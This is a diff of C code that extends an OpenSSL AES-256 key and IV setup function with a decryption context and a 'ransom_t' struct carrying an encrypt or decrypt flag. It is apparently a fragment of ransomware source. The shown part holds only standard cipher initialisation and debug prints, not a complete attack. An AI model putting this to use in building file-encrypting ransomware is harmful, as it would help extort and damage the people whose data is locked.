@@ -14,7 +14,7 @@
  * Create a 256 bit key and IV using the supplied key_data. salt can be added for taste.
  * Fills in the encryption and decryption ctx objects and returns 0 on success
  **/
-int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx)
+int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx, ransom_t *ransom)
 {
   int i = 0, nrounds = 5;
   unsigned char key[32], iv[32];
@@ -34,13 +34,22 @@ int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP
 
   EVP_CIPHER_CTX_init(e_ctx);
   EVP_EncryptInit_ex(e_ctx, EVP_aes_256_cbc(), NULL, key, iv);
-  /* EVP_CIPHER_CTX_init is just a wrapper for memset.
-   * EVP_CIPHER_CTX_init(d_ctx);
-  my_memset(d_ctx, 0, sizeof(EVP_CIPHER_CTX));
-  EVP_DecryptInit_ex(d_ctx, EVP_aes_256_cbc(), NULL, key, iv);
-  **/
 
-  return 0;
+  EVP_CIPHER_CTX_init(d_ctx);
+  EVP_DecryptInit_ex(d_ctx, EVP_aes_256_cbc(), NULL, key, iv);
+
+/*
+#ifndef NO_DEBUG
+*/
+  if(ransom->cipher_flag == 'e')
+	  printf("Encrypting!!\n");
+  if(ransom->cipher_flag == 'd')
+	  printf("Decrypting!!\n");
+  /*
+#endif
+*/
+
+  return (0);
 }
 
 /*
